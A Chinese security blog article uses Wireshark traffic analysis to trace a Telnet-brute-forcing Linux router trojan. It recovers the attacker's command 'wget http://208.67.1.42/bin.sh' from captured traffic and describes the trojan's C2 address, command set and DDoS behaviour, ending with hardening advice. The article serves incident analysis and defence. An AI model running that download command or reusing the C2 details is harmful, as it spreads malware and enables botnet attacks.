# WireShark黑客发现之旅（8）—针对路由器的Linux木马

**Author：Mr.Right、Gongmo**  
**申明：**文中提到的攻击方式仅为曝光、打击恶意网络攻击行为，切勿模仿，否则后果自负。

0x00 前言
=======

* * *

路由器木马，其主要目标是控制网络的核心路由设备；一旦攻击成功，其危害性远大于一台主机被控。

如果仅仅在路由器上面防范该类木马，那也是不够的，有很多Linux服务器违规开放Telnet端口，且使用了弱口令，一样可以中招。下面我们就一起来回顾一起真实案例。

0x01 发现异常
=========

* * *

在对客户某服务器区域进行安全监测时发现某服务器通信流量存在大量Telnet协议。截取一段数据，进行协议统计：

![p1](http://drops.javaweb.org/uploads/images/c0413a2adb383534d650aaba6d6afe2e4227a4ff.jpg)

Telnet协议一般为路由器管理协议，服务器中存在此协议可初步判断为异常流量。继续进行端口、IP走向统计：发现大量外部IP通过Tcp23端口（Telnet）连接该服务器。

![p2](http://drops.javaweb.org/uploads/images/e33e2a8909b7acc35c85da0a15f745cc8ba84025.jpg)

此统计可说明：

1.  该服务器违规开放了TCP23端口；
2.  该服务器遭到大量Telnet攻击，有可能是暴力破解，也有可能是已经成功连接。

挑选通信量较大的IP，筛选通信双向数据：

![p3](http://drops.javaweb.org/uploads/images/1a685ec74da3d4336ec2e66a25b9cb31dcda26e4.jpg)

查看Telnet数据，发现已经成功连接该服务器。

![p4](http://drops.javaweb.org/uploads/images/55850beb1dfb12c10c9680cbd380714582d718b2.jpg)

数据中还存在大量Telnet扫描探测、暴力破解攻击，在此不再详述。

0x02 获取样本
=========

* * *

为进一步查看Telnet通信内容，Follow TcpStream。

![p5](http://drops.javaweb.org/uploads/images/29c795c3fed6ea1e7b0911e9d5229945e718fadc.jpg)

将内容复制粘贴至文本编辑器：

![p6](http://drops.javaweb.org/uploads/images/941c3adc17461f7798a6caf00ddf6c4fcd1870f5.jpg)

发现一段自动下载命令：

```
wget http://208.67.1.42/bin.sh;
wget1 http://208.67.1.42/bin2.sh。

```

连接`http://208.67.1.42/bin.sh`可发现该脚本文件内容为自动下载获取木马，且木马可感染ARM、MIPS、X86、PowerPC等架构的设备。

![p7](http://drops.javaweb.org/uploads/images/71359a7bc5ee5d93f0922cf35a5491e08dba0a36.jpg)

0x03 木马分析
=========

* * *

（**注：本章节不属于Wireshark分析范畴，本文仅以jackmyx86分析为例**）

该木马文件是ELF格式的，影响的操作系统包括：

![p8](http://drops.javaweb.org/uploads/images/7bd84ff150b406226c1a846777628a75b8021b24.jpg)

从上图中判断木马下载的类型分别是：Mipsel,misp,x86(其实这个是x64),arm,x86(i586,i686)等。

从截获的`*.sh`文件看，`*.sh`脚本想删除这些目录和内容，并且关闭一些进程。

![p9](http://drops.javaweb.org/uploads/images/5d6ca5e9300b1f0a0d3b3ab20459cf1416342ca4.jpg)

首先得到了一个”Art of war”的字符串（看来黑客是个文艺青年）。

![p10](http://drops.javaweb.org/uploads/images/502eca9327df35b2e172b9ba9b76c84c88445625.jpg)

接着尝试打开路由器配置文件。

![p11](http://drops.javaweb.org/uploads/images/f8c4e08067cfdb6a5b8be0284531e58264b2e781.jpg)

在配置文件里查找字符串00000000，如果找到就直接填充0；

![p12](http://drops.javaweb.org/uploads/images/c3b1e8eb784acff3e912dfe31ddfefb6d5da8f11.jpg)

在初始化函数中：尝试建立socket连接，连接地址为：208.67.1.194:164。

![p13](http://drops.javaweb.org/uploads/images/17eb1b39980580fecd61452a32a7938ce5ad0056.jpg)

尝试连接服务器，等待远端服务器应答。

![p14](http://drops.javaweb.org/uploads/images/c040837f1fa9bb2d8cbb1dc9b37977e15eceb7fc.jpg)

服务器发送“ping”命令后，客户端返回“pong”表示已经连接成功。当发送“GETLOCALIP”后，返回控制端的本机IP。当服务器发送SCANNER后，根据ON或者OFF来控制是否要扫描指定IP，进行暴力破解。当发送“UDP”命令时候，向指定的IP地址发送大量UDP无效数据包。

![p15](http://drops.javaweb.org/uploads/images/e2b176b908e29706954d67480a11050feb100e06.jpg)

![p16](http://drops.javaweb.org/uploads/images/d722f86a2e2b4bdefc1664cdc2365fa2410be7cb.jpg)

![p17](http://drops.javaweb.org/uploads/images/cbaa10c15543be2ebd4fe9403e56a90d2c3a37ff.jpg)

下图是木马尝试获得路由器的用户名和密码匹配，企图暴力破解账户和密码。

![p18](http://drops.javaweb.org/uploads/images/51a46d9d3f187df67493f8e8d60e45e9cfbaa8ab.jpg)

![p19](http://drops.javaweb.org/uploads/images/de63c2e21310ba1a78e7f33ed5197ba309a2f462.jpg)

![p20](http://drops.javaweb.org/uploads/images/e782599233ab756d67398c5f8bf61efc0d45025b.jpg)

在被控制之后，跟随服务器指定的IP，发送大量随机生成的长度为0x400的字符串数据，进行DDOS攻击。下图是发送垃圾数据,进行DDOS攻击。

![p21](http://drops.javaweb.org/uploads/images/da085ba07ec40ececfa5abc66779b09950b7eb72.jpg)

![p22](http://drops.javaweb.org/uploads/images/67cc1bcd6af7b30f347d5399b450193bc02abaf5.jpg)

随机数据生成的伪代码如下：

![p23](http://drops.javaweb.org/uploads/images/6821d6d6f28502ed3814c116a7f3e582462c974d.jpg)

根据网址追溯到攻击者的网页和twitter账号。

![p24](http://drops.javaweb.org/uploads/images/c5ddb63b001e53d5f7346dcc3542672dcc56db96.jpg)

![p25](http://drops.javaweb.org/uploads/images/360a24d3123d1e54d034082b9d1ca8e1eec56072.jpg)

![p26](http://drops.javaweb.org/uploads/images/6de3abb27fdb8a7375622bed17e3265b9133e0d9.jpg)

0x04 总结
=======

* * *

1.  路由器的管理如非必须，尽量不开放互联网管理通道
2.  路由器管理密码必须强口令、最好超强
3.  Linux服务器一般不要打开Telnet服务
4.  该木马一般利用爆破和漏洞来攻击路由器或开启Telnet服务的Linux服务器，中招后接受木马作者的控制，最后进行大量DDOS攻击